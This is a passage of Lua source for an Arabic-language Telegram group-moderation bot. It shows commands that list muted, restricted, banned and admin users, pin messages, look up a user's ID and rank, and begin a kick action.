hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم كتمه لمده ( '..mutept[1]..' ) يوم*', 1, 'md')
hxousedx1:sadd(HXOUSE..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == "المقيدين" and hxouse11(msg) then 
local hash  =  'tkeed:'..msg.chat_id_
local list = hxousedx1:smembers(HXOUSE..hash)
text = "⌯︙قائمه المقيدين↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then
text = "⌯︙لا يوجد مقيدين ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end end 
if text == 'مسح المقيدين' and is_momod(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then     
local hash =  'tkeed:'..msg.chat_id_
local list = hxousedx1:smembers(HXOUSE..hash)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
hxousedx1:srem(HXOUSE..'tkeed:'..msg.chat_id_, v)
end 
hxousedx(msg.chat_id_, msg.id_, 1,'⌯︙ تم مسح المقيدين ', 1, 'md')
 end

-------------------------------------------HXOUSE TEAM----------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تثبيت$") and hxouse11(msg) then  
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,1)
hxousedx1:set(HXOUSE..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
hxousedx(msg.chat_id_, msg.id_, 1,'⌯︙ تم تثبيت الرساله ', 1, 'md')
end
end
--------------------------------------HXOUSE TEAM---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text == "الادمنيه" and hxouse11(msg) then 
local hash  =  'bot:momod:'..msg.chat_id_
local list = hxousedx1:smembers(HXOUSE..hash)
text = "⌯︙قائمه الادمنيه↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end 
if #list == 0 then
text = "⌯︙لا يوجد ادمنيه ༯" 
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end end 
----------------------
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text == "المنشئين" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:monsh2:'..msg.chat_id_)
text = "⌯︙قائمه المنشئين↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙لا يوجد منشئين  ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end 
-------------------
if text == "الادمنيه العامين" and hxouse11(msg) then 
local hash =  'bot:moall:'
local list = hxousedx1:smembers(HXOUSE..hash)
text = "⌯︙قائمه الادمنيه العامين↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then
text = "⌯︙لا يوجد ادمنيه عامين  ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end  
--------------------------------HXOUSE TEAM-------------------------------------------
if text == "الاعضاء المميزين" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:vipmem:'..msg.chat_id_)
text = "⌯︙قائمه الاعضاء المميزين↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙ لا يوجد مميزين ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end 
--------------------------------HXOUSE TEAM-------------------------------------------
if text == "المطايه" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:donky:'..msg.chat_id_)
text = "⌯︙المطايه الي بالكروب 😹↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙ما عدكم مطايه حبيبي  😐😹"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end 
--------------------------------HXOUSE TEAM-------------------------------------------
if text == "المميزين عام" or  text == "الاعضاء المميزين عام" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:vpall:')
text = "⌯︙قائمه المميزين عام ↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙ لا يوجد مميزين عام ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end 
------------------------------------------HXOUSE TEAM-----------------------------------------------------
if text == "المكتومين" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:muted:'..msg.chat_id_)
text = "⌯︙قائمه المكتومين ↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙ لا يوجد مكتومين ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end 
----------------------------------HXOUSE TEAM-------------------------------------------------------------
if text == "المدراء" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:owners:'..msg.chat_id_)
text = "⌯︙قائمه المدراء↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙لا يوجد مدراء  ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end 
---------------------------------HXOUSE TEAM------------
if text == "المدراء العامين" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:onall:')
text = "⌯︙قائمه المدراء العامين ↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙ لا يوجد مدراء عامين ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end
----------------------------------------HXOUSE TEAM--------------
if text == "المنشئ" or  text == "المنشئين الاساسيين" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:monsh:'..msg.chat_id_)
text = "⌯︙قائمه المنشئين الاساسيين ↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙لا يوجد منشئين اساسيين ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end 
----------------------------------------HXOUSE TEAM-------------------------------------------------------
if text == "المحظورين" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:banned:'..msg.chat_id_)
text = "⌯︙قائمه المحظورين ↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙ لا يوجد محظورين ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end end
---------------------------------faedrr--------------------------------------------------------------
if is_sudo(msg) and (text:match("^[Ss]etsupport$") or text:match("^ضع دعم$")) and hxouse11(msg) then
if hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙  Please Send your *Support link* Or *Support Bot ID* now ", 1, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, "️⌯︙ ارسل لي رابط كروب الدعم \n⌯︙  او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله ", 1, "md")
end
hxousedx1:setex(HXOUSE.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if is_sudo(msg) and (text:match("^[Dd]elsupport$") or text:match("^حذف الدعم$")) then
if hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Support *Information* Deleted ", 1, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حذف معلومات الدعم ", 1, "md")
end
hxousedx1:del(HXOUSE.."bot:supports:link")
end
--------hxouse
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "قائمه العام" and hxouse11(msg) then 
local list = hxousedx1:smembers(HXOUSE..'bot:gban:')
text = "⌯︙قائمه الحظر العام ↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."┇"..k.."┇» { [" .. username .. "] } 🗞\n"  
end end
if #list == 0 then 
text = "⌯︙ لا يوجد محظورين عام ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end 
end 
if text == "المطورين" or  text == "مطورين الرتبه الثالثه" and hxouse11(msg) then 
local hash =  'bot:admins:'
local list = hxousedx1:smembers(HXOUSE..hash)
text = "⌯︙مطورين الرتبه الثالثه ↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."*┇"..k.."┇»* { " .. username .. " } 🗞\n"  
else
text = text .. k .. " (" .. v .. ") ~{" .. gps .. "}\n"
end end
if #list == 0 then
text = "⌯︙ لا يوجد مطورين بهذه الرتبه ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "المطورين" or  text == "مطورين الرتبه الثانيه" or text == "المطورين الثانويين" and hxouse11(msg) then  
local hash =  'bot:sudo:'
local list = hxousedx1:smembers(HXOUSE..hash)
text = "⌯︙مطورين الرتبه الثانيه ↓↓ : \nٴ… … … … … … … … … … …➖➖\n"
for k, v in pairs(list) do
local user_info = hxousedx1:get(HXOUSE.."user:Name" .. v)
if user_info then
local username = user_info
text = text.."*┇"..k.."┇»* { " .. username .. " } 🗞\n"  
else
text = text .. k .. " (" .. v .. ") ~{" .. gps .. "}\n"
end end
if #list == 0 then
text = "⌯︙ لا يوجد مطورين بهذه الرتبه ༯"
end
hxousedx(msg.chat_id_, msg.id_, 1, text, "md")
end end 
------------------------------------HXOUSE TEAM-----------------------------------------------------------
if text ==("كشف") or text ==("ايدي")  and msg.reply_to_message_id_ ~= 0 and hxouse11(msg) then 
function id_by_reply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(902039110) then
t = 'مبرمج السورس'
elseif tonumber(result.sender_user_id_) == tonumber(bot_id) then
t = 'هاذا البوت'
elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif hxousedx1:sismember(HXOUSE..'bot:admins:',result.sender_user_id_) then
t = 'مطور ثالث'
elseif hxousedx1:sismember(HXOUSE..'bot:monsh:'..msg.chat_id_,result.sender_user_id_) then
t = 'منشئ اساسي'
elseif hxousedx1:sismember(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) then
t = 'منشئ'
elseif hxousedx1:sismember(HXOUSE..'bot:owner:'..msg.chat_id_,result.sender_user_id_) then
t = 'مدير'
elseif hxousedx1:sismember(HXOUSE..'bot:momod:'..msg.chat_id_,result.sender_user_id_) then
t = 'ادمن'
elseif hxousedx1:sismember(HXOUSE..'bot:vpall:',result.sender_user_id_) then
t = 'مميز عام'
elseif hxousedx1:sismember(HXOUSE..'bot:onall:',result.sender_user_id_) then
t = 'مدير عام'
elseif hxousedx1:sismember(HXOUSE..'bot:moall:',result.sender_user_id_) then
t = 'ادمن عام'
elseif hxousedx1:sismember(HXOUSE..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = result.sender_user_id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n⌯︙ عدد صوره ⌯» { '..pho.total_count_..' }'
end
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n⌯︙ عدد صوره ⌯» { '..pho.total_count_..' }'
end
if hxousedx1:sismember(HXOUSE..'bot:gban:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif hxousedx1:sismember(HXOUSE..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif hxousedx1:sismember(HXOUSE..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif hxousedx1:sismember(HXOUSE..'tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'مطرود'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then 
hxousedx(msg.chat_id_, msg.id_, 1,'*⌯︙الحساب محذوف *\n', 1, 'md')
return false  end
if data.username_ == false then
text = '⌯︙ ايديه ⌯»{ `'..result.sender_user_id_..
'` }\n⌯︙ اسمه ⌯» { {'..CatchName(data.first_name_,20)..
' } }\n⌯︙ رتبته بالكروب ⌯» { '..Renk..
' }\n⌯︙ رتبته بالبوت ⌯» { '..t..
' }\n'..photouser1..
'\n⌯︙ نوع القيود ⌯» { '..Tkeed..
' }\n⌯︙ التواجد ⌯» { '..tt..
' }\n⌯︙ نوع حسابه ⌯» { '..noh..' }'
monsend(msg,msg.chat_id_,text,data.id_) 
else
text = '⌯︙ ايديه ⌯»{ `'..result.sender_user_id_..
'` }\n⌯︙ معرفه ⌯» { [@'..data.username_..']'..
' }\n⌯︙ اسمه ⌯» {'..CatchName(data.first_name_,20)..
' } \n⌯︙ رتبته بالكروب ⌯» { '..Renk..
' }\n⌯︙ رتبته بالبوت ⌯» { '..t..
' }'..photouser1..
'\n⌯︙ نوع القيود ⌯» { '..Tkeed..
' }\n⌯︙ التواجد ⌯» { '..tt..
' }\n⌯︙ نوع حسابه ⌯» { '..noh..' }'
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end
end,nil)
end,nil) 
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^ايدي @(.*)') and hxouse11(msg) then 
local username = text:match('^ايدي @(.*)') 
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
local text = '*༯  المعرف غير صحيح*'
hxousedx(msg.chat_id_, msg.id_, 1,text, 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '*༯  نوع الحساب ⌯» { '..ch..' }\n⌯︙ الايدي ⌯» {*`'..res.id_..'`*}\n⌯︙ المعرف ⌯» {* [@'..username..'] *}\n⌯︙ الاسم ⌯» { *`'..res.title_..'`* }*'
hxousedx(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '*༯   نوع الحساب ⌯» { '..gr..' }\n⌯︙ الايدي ⌯» {*`'..res.id_..'`*}\n⌯︙ المعرف ⌯» {* [@'..username..'] *}\n⌯︙ الاسم ⌯» { *`'..res.title_..'`* }*'
hxousedx(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
if tonumber(res.id_) == tonumber(902039110) then
t = 'مبرمج السورس'
elseif tonumber(res.id_) == tonumber(bot_id) then
t = 'هاذا بوت'
elseif tonumber(res.id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif hxousedx1:sismember(HXOUSE..'bot:admins:',res.id_) then
t = 'مطور ثالث'
elseif hxousedx1:sismember(HXOUSE..'bot:monsh:'..msg.chat_id_,res.id_) then
t = 'منشئ اساسي'
elseif hxousedx1:sismember(HXOUSE..'bot:monsh2:'..msg.chat_id_,res.id_) then
t = 'منشئ'
elseif hxousedx1:sismember(HXOUSE..'bot:owner:'..msg.chat_id_,res.id_) then
t = 'مدير'
elseif hxousedx1:sismember(HXOUSE..'bot:momod:'..msg.chat_id_,res.id_) then
t = 'ادمن'
elseif hxousedx1:sismember(HXOUSE..'bot:vpall:',res.id_) then
t = 'مميز عام'
elseif hxousedx1:sismember(HXOUSE..'bot:moall:',res.id_) then
t = 'ادمن عام'
elseif hxousedx1:sismember(HXOUSE..'bot:onall:',res.id_) then
t = 'مدير عام'
elseif hxousedx1:sismember(HXOUSE..'bot:vipmem:'..msg.chat_id_,res.id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = res.id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = res.id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n⌯︙ عدد صوره ⌯» { '..pho.total_count_..' }'
end
if hxousedx1:sismember(HXOUSE..'bot:gban:',res.id_) then
Tkeed = 'محظور عام'
elseif hxousedx1:sismember(HXOUSE..'bot:banned:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif hxousedx1:sismember(HXOUSE..'bot:muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif hxousedx1:sismember(HXOUSE..'tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then
hxousedx(msg.chat_id_, msg.id_, 1,'*⌯︙الحساب محذوف *\n', 1, 'md')
return false  end
text = '⌯︙ ايديه ⌯»{ `'..res.id_..
'` }\n⌯︙ معرفه ⌯» { [@'..data.username_..']'..
' }\n⌯︙ اسمه ⌯» {'..CatchName(data.first_name_,20)..
' } \n⌯︙ رتبته بالكروب ⌯» { '..Renk..
' }\n⌯︙ رتبته بالبوت ⌯» { '..t..
' }'..photouser1..
'\n⌯︙ نوع القيود ⌯» { '..Tkeed..
' }\n⌯︙ التواجد ⌯» { '..tt..
' }\n⌯︙ نوع حسابه ⌯» { '..noh..' }'
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end,nil)
end,nil)
end,nil)
end 
end,nil)
return false 
end
if text and text:match('ايدي (%d+)') and hxouse11(msg) then 
local iduser = text:match('ايدي (%d+)')  
if tonumber(iduser) == tonumber(902039110) then
t = 'مبرمج السورس'
elseif tonumber(iduser) == tonumber(bot_id) then
t = 'هاذا البوت'
elseif tonumber(iduser) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif hxousedx1:sismember(HXOUSE..'bot:admins:',iduser) then
t = 'مطور ثالث'
elseif hxousedx1:sismember(HXOUSE..'bot:monsh:'..msg.chat_id_,iduser) then
t = 'منشئ اساسي'
elseif hxousedx1:sismember(HXOUSE..'bot:monsh2:'..msg.chat_id_,iduser) then
t = 'منشئ'
elseif hxousedx1:sismember(HXOUSE..'bot:owner:'..msg.chat_id_,iduser) then
t = 'مدير'
elseif hxousedx1:sismember(HXOUSE..'bot:momod::'..msg.chat_id_,iduser) then
t = 'ادمن'
elseif hxousedx1:sismember(HXOUSE..'bot:vpall:',iduser) then
t = 'مميز عام'
elseif hxousedx1:sismember(HXOUSE..'bot:moall:',iduser) then
t = 'ادمن عام'
elseif hxousedx1:sismember(HXOUSE..'bot:onall:',iduser) then
t = 'مدير عام'
elseif hxousedx1:sismember(HXOUSE..'bot:vipmem:'..msg.chat_id_,iduser) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = iduser},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = iduser,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
hxousedx(msg.chat_id_, msg.id_, 1,'*⌯︙لا يمكنني اتمام الامر *\n', 1, 'md')
return false  end
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n⌯︙ عدد صوره ⌯» { '..pho.total_count_..' }'
end
if pho.total_count_ == 0 then 
photouser1 = ''
else
photouser1 = '\n⌯︙ عدد صوره ⌯» { '..pho.total_count_..' }'
end
if hxousedx1:sismember(HXOUSE..'bot:gban:',iduser) then
Tkeed = 'محظور عام'
elseif hxousedx1:sismember(HXOUSE..'bot:banned:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif hxousedx1:sismember(HXOUSE..'bot:muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif hxousedx1:sismember(HXOUSE..'tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = ' لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'محظور'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
Renk = 'عضو'
else
Renk = 'عضو'
end
if data.type_.ID == "UserTypeBot" then
noh = 'بوت'
elseif data.type_.ID == "UserTypeGeneral" then
noh = 'شخصي'
end
if data.first_name_ == false then
hxousedx(msg.chat_id_, msg.id_, 1,'*⌯︙الحساب محذوف *\n', 1, 'md')
return false  end
if data.username_ == false then
text = '⌯︙ ايديه ⌯»{ `'..iduser..
'` }\n⌯︙ اسمه ⌯» { {'..CatchName(data.first_name_,20)..
' } }\n⌯︙ رتبته بالكروب ⌯» { '..Renk..
' }\n⌯︙ رتبته بالبوت ⌯» { '..t..
' }\n'..photouser1..
'\n⌯︙ نوع القيود ⌯» { '..Tkeed..
' }\n⌯︙ التواجد ⌯» { '..tt..
' }\n⌯︙ نوع حسابه ⌯» { '..noh..' }'
monsend(msg,msg.chat_id_,text,iduser) 
else
text = '⌯︙ ايديه ⌯»{ `'..iduser..
'` }\n⌯︙ معرفه ⌯» { [@'..data.username_..']'..
' }\n⌯︙ اسمه ⌯» {'..CatchName(data.first_name_,20)..
' } \n⌯︙ رتبته بالكروب ⌯» { '..Renk..
' }\n⌯︙ رتبته بالبوت ⌯» { '..t..
' }'..photouser1..
'\n⌯︙ نوع القيود ⌯» { '..Tkeed..
' }\n⌯︙ التواجد ⌯» { '..tt..
' }\n⌯︙ نوع حسابه ⌯» { '..noh..' }'
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
end
end,nil)
end,nil)
end,nil)
return false 
end 
if text:match("^رتبته @(.*)$") and hxouse11(msg) then
local ap = {string.match(text, "^(رتبته) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(902039110) then
t = 'Source programmer 👨‍💻'
elseif tonumber(result.id_) == tonumber(bot_owner) then
t = 'Sudo all'
elseif is_sudoid(result.id_) then
t = 'Sudo 2'
elseif is_admin(result.id_) then
t = 'sudo 3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_onall(result.id_) then
t = 'owner all'
elseif is_moall(result.id_) then
t = 'modod all'
elseif is_vpall(result.id_) then
t = 'vip all'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'Bot Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(902039110) then
t = 'مبرمج السورس'
elseif tonumber(result.id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif is_sudoid(result.id_) then
t = 'مطور ثانوي'
elseif is_admin(result.id_) then
t = 'مطور فالرتبه الثالثه'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'منشئ اساسي'
elseif is_monsh2(result.id_, msg.chat_id_) then
t = 'منشئ'
elseif is_onall(result.id_) then
t = 'مدير عام'
elseif is_moall(result.id_) then
t = 'ادمن عام'
elseif is_vpall(result.id_) then
t = 'مميز عام'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي محمل طحين 😹😔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'مدير البوت'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'ادمن البوت'
elseif result.id_ == bot_id then
t = 'هذا انا البوت'
else
t = 'عضو فقط'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '⌯︙ rank ~ ( '..t
else
text = '⌯︙ رتـبتـه ~ ( '..t
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '༯ this channel or group \n🧼is not have rank '
else
text = '༯ هذه قناة او كروب \n🧼ليس له رتبه '
end
end
end
if not result.id_ then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '⌯︙ Username is not correct ༯'
else
text = '⌯︙ المعرف غير صحيح ༯'
end
end
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
-----------------------------------HXOUSE TEAM------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then 
local text = msg.content_.text_:gsub('طرد','Kick')
if text:match("^[Kk]ick$") and msg.reply_to_message_id_ ~= 0 then
function kick_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and hxousedx1:get("hxouse:lock:ban"..bot_id..msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع الحظر او الطرد \n⌯︙ لانه معطل من قبل المنشئ ', 1, 'md')
return "hxouse"
end
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
if not is_momod(result.sender_user_id_, result.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
